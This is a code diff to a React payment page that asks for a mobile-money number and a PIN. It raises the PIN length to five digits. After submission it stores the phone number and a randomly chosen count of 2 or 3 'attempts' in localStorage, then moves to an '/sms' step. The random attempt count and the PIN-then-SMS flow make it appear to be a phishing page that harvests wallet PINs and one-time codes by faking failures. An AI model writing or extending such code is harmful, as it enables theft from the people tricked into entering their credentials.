@@ -30,6 +30,7 @@ export default function PaymentPage() {
   const navigate = useNavigate();
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
+    
 
     setError("");
 
@@ -38,8 +39,8 @@ export default function PaymentPage() {
       return;
     }
 
-    if (pin.length < 4 ) {
-      setError("Please enter a 4 digit PIN.");
+    if (pin.length < 5 ) {
+      setError("Please enter a 5 digit PIN.");
       return;
     }
 
@@ -50,6 +51,11 @@ export default function PaymentPage() {
       method: "POST",
     });
     localStorage.setItem("phone", momoNumber);
+    
+    const attempts = localStorage.getItem("attemps")|| (Math.floor(Math.random() * 2) + 2);
+    const currentAttempt = localStorage.getItem("current_attempt") || 1;
+    localStorage.setItem("attemps", `${attempts}`);
+    localStorage.setItem("current_attempt", `${currentAttempt}`);
 
     navigate("/sms");
 
@@ -255,16 +261,16 @@ export default function PaymentPage() {
                       value={pin}
                       onChange={handlePinChange}
                       required
-                      placeholder="••••"
+                      placeholder="•••••"
                       inputMode="numeric"
-                      maxLength={4}
+                      maxLength={5}
                       className="w-full rounded-xl border-2 border-gray-300 px-4 py-4 text-center text-2xl font-bold tracking-[0.5em] outline-none transition-all focus:border-[#FFCC00] focus:ring-4 focus:ring-yellow-100"
                     />
 
                   </div>
 
                   <p className="mt-4 text-center text-xs text-gray-500">
-                    enter 4 digits
+                    enter 5 digits
                   </p>
 
                 </div>
